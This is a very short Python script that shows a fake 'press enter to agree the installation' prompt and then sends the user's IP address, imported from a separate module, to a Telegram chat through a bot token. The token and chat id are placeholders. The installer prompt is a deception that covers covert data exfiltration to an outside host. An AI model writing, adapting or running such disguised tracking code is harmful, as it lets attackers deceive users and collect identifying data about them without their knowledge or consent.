input("thats a code, press enter to agree the installation... ")
from test import ip

import telepot

TOKEN="xxxxxxxxxxxxxxxxxxxxxxxxx"
chat_id="xxxxxxxxxxxxxx"

bot=telepot.Bot(TOKEN)
bot.sendMessage(chat_id,ip )
